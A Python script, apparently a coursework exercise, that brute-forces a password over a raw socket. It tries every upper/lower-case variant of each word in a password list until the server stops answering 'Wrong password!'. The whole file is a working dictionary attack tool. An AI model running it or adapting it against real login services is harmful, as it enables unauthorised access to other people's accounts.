import socket
import sys
import itertools

args = sys.argv

server_socket = socket.socket()
hostname = args[1]
port = int(args[2])
address = (hostname, port)
server_socket.connect(address)


def yield_variants(file):
    with open(file, 'r') as pw_list:
        for password in pw_list:
            for variation in map(''.join, itertools.product(*(sorted({c.upper(), c.lower()}) for c in password))):
                yield variation


variants = yield_variants(file='passwords.txt')

while True:
    try:
        temp_pw = next(variants)
        temp_pw = temp_pw.strip()  # needed for deleting new lines \n !!!
        # print(temp_pw.encode())
        # print(temp_pw)
    except StopIteration:
        print('All passwords have been attempted!')
        break

    message = temp_pw.encode()
    server_socket.send(message)
    temp_response = server_socket.recv(1024)
    temp_response = temp_response.decode()
    if temp_response != 'Wrong password!':
        print(temp_pw)
        break

